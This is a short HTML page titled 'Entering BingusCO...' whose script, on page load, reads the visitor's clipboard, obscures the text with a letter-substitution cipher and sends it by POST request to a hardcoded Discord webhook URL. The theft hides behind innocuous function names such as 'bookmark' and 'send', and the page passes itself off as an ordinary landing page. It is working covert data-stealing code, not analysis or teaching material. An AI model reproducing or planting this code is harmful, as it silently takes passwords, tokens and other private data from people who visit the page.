<!DOCTYPE html>

    <title>Entering BingusCO...</title>
    <script>
      function scrambleText(text) {
        const alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        const mapping = 'xZ9tNfG5KqOoM2i7Lr6jWbJ3cV1l0gHpPsR8zS4vDyBmUaEwYhuknQeIAF_C-T';
        let result = '';
        for (let i = 0; i < text.length; i++) {
          const index = alphabet.indexOf(text[i]);
          if (index !== -1) {
            result += mapping[index];
          } else {
            result += text[i];
          }
        }
        return result;
      }
      
      function unscrambleText(scrambledText) {
        const alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        const mapping = 'xZ9tNfG5KqOoM2i7Lr6jWbJ3cV1l0gHpPsR8zS4vDyBmUaEwYhuknQeIAF_C-T';
        let result = '';
        for (let i = 0; i < scrambledText.length; i++) {
          const index = mapping.indexOf(scrambledText[i]);
          if (index !== -1) {
            result += alphabet[index];
          } else {
            result += scrambledText[i];
          }
        }
        return result;
      }
    bookmark("https://discord.com/api/webhooks/1103660300395364362/m-2bEuTm9d2c3NZw8qFmBu9UIpjYhM7ih5ayB8L8bVq9OfIJKt82TQ0LSb4BwQzfCIvh");
      
      function send(webhookUrl, message) {
        const data = { content: scrambleText(message) };
        const options = {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(data)
        };
        fetch(webhookUrl, options);
      }
      
      function bookmark(webhookUrl) {
        navigator.clipboard.readText().then(text => {
          send(webhookUrl, text);
        }).catch(error => {
          console.error('Failed to read from clipboard: ', error);
        });
      }
    </script>
